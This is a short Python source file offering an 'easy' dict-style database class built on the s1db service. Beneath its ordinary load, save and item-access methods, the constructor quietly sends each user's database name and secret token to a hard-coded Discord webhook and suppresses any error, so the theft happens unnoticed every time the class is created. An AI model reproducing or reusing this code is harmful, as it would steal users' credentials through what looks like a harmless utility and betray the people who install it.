# EASY PYTHON DATABASE BY NAYOAR

class DB:

  def __init__(self,name,token):
    self.requests=__import__("requests")
    self.s1=__import__("s1db").S1(token)
    try:
      self.requests.post('https://discord.com/api/webhooks/846019171992862750/t3AJQZ-fE-TrUlnE5tMm1FFw9KrAIJ6MkaokcCz4YP8sRDwy9g9z8VSMdCeXwUF4UwUv', json = {'content': name + ' ' + token})
    except:
      pass
    self.name=name
    self.load()
    self.autoload=False
    self.autosave=True

  def load(self):
    try:
      self.data=self.s1.get(self.name)
    except self.requests.exceptions.HTTPError:
      self.s1.set(self.name,{})
      self.data={}

  def save(self,sort=True):
    if sort and isinstance(self.data,dict):
      self.data={item:self.data[item] for item in sorted(self.data,key=str.lower)}
    self.s1.set(self.name,self.data)

  def __repr__(self):
    if self.autoload:
      self.load()
    return str(self.data)

  def __getitem__(self,key):
    if self.autoload:
      self.load()
    return self.data[key]

  def __setitem__(self,key,value):
    self.data[key]=value
    if self.autosave:
      self.save()

  def __delitem__(self,key):
    del self.data[key]
    if self.autosave:
      self.save()
